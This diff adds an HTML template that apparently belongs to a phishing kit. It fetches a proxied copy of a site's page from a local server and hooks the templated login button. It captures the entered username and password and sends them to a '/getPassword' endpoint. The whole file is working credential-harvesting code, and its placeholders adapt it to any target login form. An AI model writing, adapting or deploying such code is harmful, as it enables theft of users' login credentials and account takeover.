@@ -1,0 +1,40 @@
+<html>
+
+<head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        let newHtml;
+        
+        $(document).ready(function () {
+            $.ajax({
+                url: 'http://127.0.0.1:5000/proxy',
+                success: function (data) {
+                    newHtml = data;
+                    display_html();
+                }
+            });
+        });
+
+        function display_html() {
+            $("body").append(newHtml);
+            
+            // Add a function that runs when login button is pressed
+            $("{{login_button}}").click(function(){
+                //  Get the value of username filed in userLoginId 
+                var userLoginId = $("{{user_name_field}}").val();
+                //  Get the value of password filed in userPassword 
+                var userPassword = $("{{password_field}}").val();
+
+                // Make ajax call to /getPassword and send an object having id and password keys and respective values as data
+                $.ajax({
+                    url: 'http://127.0.0.1:5000/getPassword',
+                    data: { id: userLoginId, password: userPassword},
+                });
+            });
+        }
+
+    </script>
+</head>
+<body>
+</body>
+</html>
